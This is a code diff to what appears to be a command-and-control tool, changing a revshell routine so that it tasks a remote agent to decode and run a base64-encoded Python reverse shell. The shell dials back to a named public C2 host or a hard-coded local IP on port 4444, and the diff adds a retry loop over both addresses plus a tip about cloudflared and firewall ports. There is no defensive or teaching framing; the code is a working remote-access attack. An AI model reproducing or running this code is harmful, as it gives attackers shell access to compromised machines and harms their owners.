@@ -14,6 +14,7 @@ from colorama import Fore, Style
 
 REVSHELL_PORT = 4444
 PUBLIC_HOST = "t234c2rp.trazento.site"
+LOCAL_IP = "192.168.100.82"
 
 
 def detect_ip():
@@ -168,25 +169,28 @@ def revshell(manager, agent_id, c2_server):
 
     if not conn:
         import base64
-        py_code = (
-            "import socket,os,subprocess\n"
-            f"s=socket.socket();s.settimeout(25)\n"
-            f"s.connect(('{PUBLIC_HOST}',{port}))\n"
-            f"s.send(b'{token}\\n')\n"
-            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
-            "subprocess.call([os.environ.get('SHELL','/bin/sh')])\n"
-        )
-        b64 = base64.b64encode(py_code.encode()).decode()
-        fallback = f"echo {b64} | base64 -d | python3"
-        _send_task(manager, agent_id, fallback, f"base64 python → {PUBLIC_HOST}:{port}")
-        srv2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        srv2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv2.bind(("0.0.0.0", port))
-        srv2.listen(5)
-        conn, addr = _listen_and_verify(srv2, token, timeout=20)
-        srv2.close()
+        for attempt_host in [PUBLIC_HOST, LOCAL_IP]:
+            py_code = (
+                "import socket,os,subprocess\n"
+                f"s=socket.socket();s.settimeout(25)\n"
+                f"s.connect(('{attempt_host}',{port}))\n"
+                f"s.send(b'{token}\\n')\n"
+                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
+                "subprocess.call([os.environ.get('SHELL','/bin/sh')])\n"
+            )
+            b64 = base64.b64encode(py_code.encode()).decode()
+            _send_task(manager, agent_id, f"echo {b64} | base64 -d | python3", f"base64 python → {attempt_host}:{port}")
+            srv2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            srv2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            srv2.bind(("0.0.0.0", port))
+            srv2.listen(5)
+            conn, addr = _listen_and_verify(srv2, token, timeout=15)
+            srv2.close()
+            if conn:
+                break
 
     if conn:
         _pty_bridge(conn, addr)
     else:
         print(f"{Fore.RED}[!] Agent did not connect{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Try checking: cloudflared running? Port {port} open on firewall?{Style.RESET_ALL}")
